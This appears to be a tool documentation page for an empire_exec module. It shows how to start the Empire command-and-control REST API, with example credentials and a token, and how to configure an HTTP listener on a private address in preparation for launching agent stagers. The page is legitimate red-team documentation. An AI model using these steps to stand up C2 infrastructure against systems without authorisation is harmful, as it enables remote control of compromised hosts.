# Empire Agent

### We can use the empire_exec module to execute an Empire Agent's initial stager. In the background, the module connects to Empire's RESTful API, generates a launcher for the specified listener and executes it.

## 1) First, setup the rest API:

#### #~ python powershell-empire --rest --user empireadmin --pass Password123!

[*] Loading modules from: /home/mpgn/Tools/Empire/lib/modules/

 * Starting Empire RESTful API on port: 1337
 
 * RESTful API token: l5l051eqiqe70c75dis68qjheg7b19di7n8auzml
 
 * Running on https://0.0.0.0:1337/ (Press CTRL+C to quit)

## 2) Second, setup a listener


(Empire: listeners) > set Name test

(Empire: listeners) > set Host 192.168.10.3

(Empire: listeners) > set Port 9090

(Empire: listeners) > set CertPath data/empire.pem

(Empire: listeners) > run

(Empire: listeners) > list

[*] Active listeners:

  ID    Name              Host                                 Type      Delay/Jitter   KillDate    Redirect Target
  --    ----              ----                                 -------   ------------   --------    ---------------
  1     test              http://192.168.10.3:9090                 native    5/0.0                      

(Empire: listeners) > 

